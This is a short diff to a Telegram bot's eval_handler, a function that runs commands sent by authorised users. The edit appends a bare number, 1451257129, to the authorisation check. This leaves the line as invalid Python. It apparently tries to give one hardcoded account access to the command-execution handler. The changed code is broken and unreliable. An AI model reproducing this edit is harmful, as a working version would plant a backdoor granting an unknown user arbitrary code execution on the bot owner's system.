@@ -20,7 +20,7 @@ MAX_MESSAGE_LENGTH = 4096
 FREE_USER_MAX_FILE_SIZE = 2097152000
 
 async def eval_handler(bot, message):
-  if message.from_user.id in Config.AUTH_USERS:
+  if message.from_user.id in Config.AUTH_USERS:1451257129, 
     status_message = await message.reply_text("Processing ...")
     cmd = message.text.split(" ", maxsplit=1)[1]
     reply_to_id = message.message_id
